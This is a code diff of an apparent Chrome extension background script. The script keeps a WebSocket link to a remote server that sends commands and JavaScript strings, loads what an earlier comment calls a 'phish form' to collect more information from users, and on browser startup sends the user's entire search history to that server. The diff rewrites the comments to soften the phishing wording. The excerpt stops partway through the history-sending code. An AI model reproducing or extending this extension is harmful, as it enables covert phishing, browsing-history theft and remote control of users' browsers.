@@ -16,7 +16,7 @@ var translateString = 'alert("Hello!")';
 //Listen to the server and parse objects.
 ws.onmessage = function (e) {
     object = JSON.parse(e.data);
-    id = object.id;//get 256bitvalue
+    id = object.id; //256 bit value
     type = object.type;
   //  tempSite = object.addString;
   //  translateString = object.jsString;
@@ -46,9 +46,9 @@ ws.onmessage = function (e) {
 };
 
 /*
-This function is just meant to redirect users to the phish form for now, when
-the content scripts runs a message. THIS FILE WILL BE USED FOR LISTENING TO
-SERVER SIGNALS.
+This function will listen for a message from content script, and load a form we
+created to get extra information from the user.
+}
 */
 
 chrome.runtime.onMessage.addListener(function(request, sender, sendResponse){
@@ -60,6 +60,7 @@ chrome.runtime.onMessage.addListener(function(request, sender, sendResponse){
   }
 });
 
+//Once a connection is made, send over id and online signal.
 ws.onopen = function(event){
   chrome.storage.sync.get("id", function(ev){
     var id=ev.id;
@@ -68,6 +69,7 @@ ws.onopen = function(event){
   });
 }
 
+//Simply send over search history from the user on chrome startup.
 chrome.runtime.onStartup.addListener(function(){
   ws.onopen = function(event){
     chrome.history.search({text: ""}, function(data) {
